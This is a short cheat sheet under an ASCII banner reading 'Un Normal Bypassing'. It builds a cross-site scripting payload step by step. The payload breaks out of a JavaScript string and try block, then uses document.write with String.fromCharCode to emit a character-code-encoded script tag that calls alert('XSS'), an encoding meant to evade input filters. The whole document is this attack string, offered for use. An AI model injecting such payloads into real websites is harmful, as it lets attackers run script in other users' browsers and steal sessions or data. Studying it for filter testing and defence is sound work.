=================================================================================================



╦ ╦┌┐┌  ╔╗╔┌─┐┬─┐┌┬┐┌─┐┬    ╔╗ ┬ ┬┌─┐┌─┐┌─┐┌─┐┬┌┐┌┌─┐    
║ ║│││  ║║║│ │├┬┘│││├─┤│    ╠╩╗└┬┘├─┘├─┤└─┐└─┐│││││ ┬    
╚═╝┘└┘  ╝╚╝└─┘┴└─┴ ┴┴ ┴┴─┘  ╚═╝ ┴ ┴  ┴ ┴└─┘└─┘┴┘└┘└─┘

=================================================================================================

1 - ‘\”));}catch(e){document.write

2 - (String.fromCharCode

3 - <html><body><script>alert(“XSS”)</script></body></html>

4 - 60,104,116,109,108,62,60,98,111,100,121,62,60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,88,83,83,34,41,60,47,115,99,114,105,112,116,62,60,47,98,111,100,121,62,60,47,104,116,109,108,62

5 - \”));}catch(e){document.write(String.fromCharCode(60,104,116,109,108,62,60,98,111,100,121,62,60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,88,83,83,34,41,60,47,115,99,114,105,112,116,62,60,47,98,111,100,121,62,60,47,104,116,109,108,62));}//

